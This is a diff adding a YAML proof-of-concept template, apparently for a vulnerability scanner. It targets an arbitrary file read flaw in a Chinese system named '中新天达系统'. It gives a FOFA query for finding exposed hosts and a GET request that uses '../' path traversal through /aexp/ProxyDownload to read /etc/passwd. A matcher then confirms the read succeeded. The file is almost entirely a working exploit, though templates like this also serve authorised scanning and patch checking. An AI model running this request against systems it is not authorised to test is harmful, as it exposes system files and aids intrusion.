@@ -1,0 +1,15 @@
+id: poc-yaml-zxtd-system-anyfile-read
+info:
+  name: 中新天达系统 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 中新天达系统
+  fofa: body="aexp/ValidateImage"
+requests:
+- method: GET
+  path: /aexp/ProxyDownload?path=/speedec/webapps/webftp/../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"fileName=") && !contains(body,"<")
+variables: {}
+transport: http
